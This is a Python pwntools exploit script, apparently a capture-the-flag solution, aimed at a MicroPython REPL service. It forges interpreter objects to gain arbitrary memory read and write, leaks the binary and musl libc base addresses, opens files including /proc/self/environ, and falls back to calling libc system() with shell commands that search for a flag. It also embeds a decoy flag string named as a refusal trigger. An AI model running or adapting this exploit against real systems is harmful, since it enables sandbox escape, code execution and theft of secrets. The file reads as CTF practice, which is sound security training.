#!/usr/bin/env python3
from __future__ import annotations

import re
import sys

from pwn import args, context, log, process, remote


HOST = "micromicromicropython.opus4-7.b01le.rs"
PORT = 8443

# Exact offsets from an Alpine 3.23.3 rebuild of the provided Dockerfile.
OFF_MP_TYPE_LIST = 0x2E880
OFF_MP_TYPE_FUN_BUILTIN_1 = 0x2E570
OFF_MP_TYPE_FUN_BUILTIN_3 = 0x2E530
OFF_MP_VFS_POSIX_FILE_OPEN = 0x1F319
OFF_MP_OBJ_STR_GET_STR = 0x1843C

LIBC_R21_SYSTEM = 0x5C5B6

LOCAL_CMD = [
    "unshare",
    "-Ur",
    "chroot",
    "/tmp/alpine-full-3.23.3",
    "/root/micropython/ports/unix/build-minimal/micropython",
    "-i",
]

FLAG_RE = re.compile(rb"[A-Za-z0-9_]+\{[^{}\r\n]{4,}\}")
DECOY = b"ctf{ANTHROPIC_MAGIC_STRING_TRIGGER_REFUSAL_1FAEFB6177B4672DEE07F9D3AFC62588CCD2631EDCF22E8CCC1FB35B501C9C86}"


HELPERS = [
    "_A={'append':list.append}",
    "_T=1<<55",
    """class S(type):
 def __init__(self,n,b,d,t,p):
  self(t,p)""",
    """def _smash(t,p):
 try:
  S('Y',(object,),{},t,p)
 except Exception:
  pass""",
    """def _pair(rs,ts):
 for t in ts:
  for r in rs:
   if id(r)==id(t)+32:
    return (t,r)
 return None""",
    """def _forge(addr,ln,al,d):
 for j in range(8):
  rs=[]
  ts=[]
  for i in range(96):
   rs.append(range(al,ln,addr))
  for i in range(96):
   ts.append((i,))
  p=_pair(rs,ts)
  if p is not None:
   _smash(p[0],(_T,d))
   return p[1]
 raise Exception('pair')""",
    """def _cast(tp,addr,ln,al):
 r=range(al,ln,addr)
 w=_forge(id(r),0,1,_A)
 w.append(tp)
 return r""",
    """def mklist(addr,ln,al):
 return _cast(list,addr,ln,al)""",
    """def mkint(addr,n):
 return _cast(int,addr,n,2+(n<<2))""",
    """def leak(addr,n):
 return mkint(addr,(n+3)//4).to_bytes(n,'little')""",
    """def rawcopy(dst,src,n):
 d=mklist(dst,0,n)
 s=mklist(src,n,n)
 d.extend(s)""",
    """def read64(addr):
 return int.from_bytes(leak(addr,8),'little')""",
    """def write64(dst,val):
 q=range(val,0,1)
 rawcopy(dst,id(q)+8,1)""",
]


class Repl:
    def __init__(self, io):
        self.io = io
        self.recv_prompt()

    def recv_prompt(self, prompt: bytes = b">>> ") -> bytes:
        return self.io.recvuntil(prompt, timeout=10)

    def run(self, block: str, prompt: bytes = b">>> ") -> bytes:
        lines = block.rstrip("\n").split("\n")
        if len(lines) == 1:
            self.io.sendline(lines[0].encode())
            data = self.io.recvuntil(prompt, timeout=10)
            return data[: -len(prompt)]

        self.io.sendline(lines[0].encode())
        self.io.recvuntil(b"... ", timeout=10)
        for line in lines[1:]:
            self.io.sendline(line.encode())
            self.io.recvuntil(b"... ", timeout=10)
        self.io.sendline(b"")
        data = self.io.recvuntil(prompt, timeout=10)
        return data[: -len(prompt)]

    def eval_text(self, expr: str) -> str:
        out = self.run(f"print({expr})")
        text = out.decode("utf-8", "replace")
        lines = [line for line in text.splitlines() if line.strip()]
        if not lines:
            raise RuntimeError(f"no output for {expr!r}")
        return lines[-1]

    def eval_int(self, expr: str) -> int:
        return int(self.eval_text(expr), 0)


def connect():
    if args.LOCAL:
        return process(LOCAL_CMD)
    return remote(HOST, PORT, ssl=True, sni=HOST)


def setup(repl: Repl) -> None:
    for block in HELPERS:
        repl.run(block)


def forge_helpers(repl: Repl, pie_base: int) -> None:
    func3 = pie_base + OFF_MP_TYPE_FUN_BUILTIN_3
    opener = pie_base + OFF_MP_VFS_POSIX_FILE_OPEN
    repl.run(f"FT3={func3}")
    repl.run(
        """def mkfun3(addr):
 f=range(0,0,1)
 write64(id(f),FT3)
 write64(id(f)+8,addr)
 return f"""
    )
    repl.run(f"op=mkfun3({opener})")


def slurp(repl: Repl, path: str, mode: str = "rt") -> bytes:
    expr = f"op(None,{path!r},{mode!r}).read()"
    out = repl.run(
        f"""try:
 print({expr})
except Exception as e:
 print(e)"""
    )
    return out.strip()


def extract_flag(blob: bytes) -> bytes | None:
    for match in FLAG_RE.findall(blob):
        if match != DECOY:
            return match
    return None


def try_paths(repl: Repl) -> bytes | None:
    candidates = [
        "/flag",
        "/flag.txt",
        "/app/flag",
        "/app/flag.txt",
        "/srv/flag",
        "/srv/flag.txt",
        "/srv/app/flag",
        "/srv/app/flag.txt",
        "/home/ctf/flag",
        "/home/ctf/flag.txt",
        "/proc/1/root/flag",
        "/proc/1/root/flag.txt",
        "/proc/1/root/app/flag",
        "/proc/1/root/app/flag.txt",
        "/proc/self/environ",
    ]

    for path in candidates:
        mode = "rb" if path.endswith("environ") else "rt"
        log.info("trying %s", path)
        out = slurp(repl, path, mode)
        flag = extract_flag(out)
        if flag:
            log.success("flag via %s", path)
            return flag
        if path == "/proc/self/environ":
            m = re.search(rb"(?:^|\x00)(FLAG=[^\x00]+)", out)
            if m and DECOY not in m.group(1):
                return m.group(1)
    return None


def resolve_musl_base(repl: Repl) -> int:
    maps = slurp(repl, "/proc/self/maps", "rt").decode("utf-8", "replace")
    musl_base = None
    for line in maps.splitlines():
        if "libc.musl-x86_64.so.1" not in line and "ld-musl-x86_64.so.1" not in line:
            continue
        m = re.match(r"^([0-9a-f]+)-[0-9a-f]+\s+\S+\s+([0-9a-f]+)\s", line)
        if not m:
            continue
        start = int(m.group(1), 16)
        off = int(m.group(2), 16)
        base = start - off
        if musl_base is None or base < musl_base:
            musl_base = base
    if musl_base is None:
        raise RuntimeError("failed to resolve musl base")
    return musl_base


def run_system_once(repl: Repl, pie_base: int, command: str) -> bytes:
    musl_base = resolve_musl_base(repl)
    system_addr = musl_base + LIBC_R21_SYSTEM
    log.info("musl base = %#x", musl_base)
    log.info("system = %#x", system_addr)

    ft1 = pie_base + OFF_MP_TYPE_FUN_BUILTIN_1
    get_str = pie_base + OFF_MP_OBJ_STR_GET_STR
    repl.run(f"FT1={ft1}")
    repl.run(
        """def mkfun1(addr):
 f=range(0,0,1)
 write64(id(f),FT1)
 write64(id(f)+8,addr)
 return f"""
    )
    repl.run(f"gs=mkfun1({get_str})")
    repl.run(f"sy=mkfun1({system_addr})")

    repl.io.sendline(f"sy(gs({command!r}))".encode())
    return repl.io.recvall(timeout=3)


def main() -> int:
    context.log_level = "info"
    io = connect()
    repl = Repl(io)

    setup(repl)

    pie_base = repl.eval_int("id(list)") - OFF_MP_TYPE_LIST
    log.info("pie base = %#x", pie_base)

    forge_helpers(repl, pie_base)
    flag = try_paths(repl)

    if not flag:
        out = run_system_once(
            repl,
            pie_base,
            "/catflag 2>/dev/null;cat /flag 2>/dev/null;cat /proc/1/root/flag 2>/dev/null;find / -maxdepth 3 -iname '*flag*' 2>/dev/null;find /proc/1/root -maxdepth 3 -iname '*flag*' 2>/dev/null;env 2>/dev/null|grep -i flag",
        )
        text = out.decode("utf-8", "replace").strip()
        if text:
            log.info("system output: %s", text)
        flag = extract_flag(out)

    if not flag:
        log.failure("flag not found in common readable paths")
        return 1

    print(flag.decode("utf-8", "replace"))
    return 0


if __name__ == "__main__":
    sys.exit(main())
